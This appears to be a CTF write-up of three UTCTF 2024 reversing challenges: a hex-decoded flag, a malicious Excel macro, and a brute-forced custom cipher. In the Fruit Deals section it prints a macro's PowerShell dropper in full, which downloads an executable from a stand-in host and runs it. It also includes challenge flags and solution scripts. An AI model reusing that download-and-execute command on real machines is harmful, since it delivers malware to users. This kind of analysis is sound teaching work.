# UTCTF 2024
## Beginner: Basic Reversing Problem

In keygen function, the program consecutively added characters to the key.

![image](https://github.com/san601/CTF_Archive/assets/144963803/cef44d9d-982f-4bb4-addc-d3fc1fb89884)

Concatenating those characters and we got the flag.

```python
a = [
    0x75, 0x74, 0x66, 0x6c, 0x61, 0x67, 0x7b, 0x69, 0x5f, 0x63, 0x34, 0x6e,
    0x5f, 0x72, 0x33, 0x76, 0x21, 0x7d,
]
for i in a:
    print(chr(i), end='')
```

![image](https://github.com/san601/CTF_Archive/assets/144963803/84cb1da7-fe14-4940-b1b8-430b982b28b0)

## Fruit Deals

We got 2 macros in the file, let's just focus on the first one.

![image](https://github.com/san601/CTF_Archive/assets/144963803/dbbb6c1f-13ce-4b0a-9be0-603733d6e8c5)

Sheet1 and sheet2 were full of random Base64 stuffs

![image](https://github.com/san601/CTF_Archive/assets/144963803/fcd327de-3178-40ac-9e8f-fe58d4ff2c6b)

So basically, this macro check if a cell contained some string, if true, it put some part of a payload into a variable. This payload might be used to download some files.

![image](https://github.com/san601/CTF_Archive/assets/144963803/e5882d47-aff1-4325-8f9f-85c6cccc4b47)

Set a breakpoint just right before the macro execute the payload.

![image](https://github.com/san601/CTF_Archive/assets/144963803/bd1e358a-96e3-4d55-8b36-b830f26b5e24)

We got the payload
```
"poWeRsHELL -command "$oaK = new-object Net.WebClient;$OrA = 'http://fruit.gang/malware';$CNTA = 'banANA-Hakrz09182afd4';$jri=$env:public+'\'+$CNTA+'.exe';try{$oaK.DownloadFile($OrA, $jri);Invoke-Item $jri;break;} catch {}""
```

It is clearly stated that the macro was going to download a file from 
```
http://fruit.gang/malware/banANA-Hakrz09182afd4.exe
```

So the flag is utflag{banANA-Hakrz09182afd4.exe}

## PES-128

After a while, I noticed that:
- Each character in the output string was not calculated based on a whole input string.
- The program treated our input as a string of hex bytes:
  
This was my input:

![image](https://github.com/san601/CTF_Archive/assets/144963803/9a8d78c6-d231-4bbe-95ed-a656085d0936)

This was how the program store my input:

![image](https://github.com/san601/CTF_Archive/assets/144963803/7a9183b7-1145-40be-9bbd-ca1feab07174)

This was my input after some calculation:

![image](https://github.com/san601/CTF_Archive/assets/144963803/46404e51-1210-44b1-a73a-ff239ef2c45a)

This was the output:

![image](https://github.com/san601/CTF_Archive/assets/144963803/46fb9de2-3ce1-40a7-9041-211ebde7b2f3)

With those idea in mind, we can now brute-forcing each character at a time, compare it with the encrypted flag.

Here is my script to cAptURe tHe fLaG.
```python
from pwn import *

enc_flag = '75ac713a945e9f78f657b735b7e1913cdece53b8853f3a7daade83b319c49139f8f655b0b77b'

flag = ''

flag_len = len(enc_flag)//2

for i in range(flag_len):
    for j in range(33, 126):
        binary_path = './PES'
        p = process(binary_path)
        p.sendline(flag + str(hex(j)[2:]))

        output = p.recvall().decode()
        output = output.split()
        current_length = len(output[1])
        if output[1] == enc_flag[:current_length]:
            print(chr(j), end='')
            flag += str(hex(j)[2:])
        p.close()

print(bytes.fromhex(flag).decode('utf-8')
```

![image](https://github.com/san601/CTF_Archive/assets/144963803/d3b4acb1-c6bc-4871-8fd9-c4e1fcc69397)

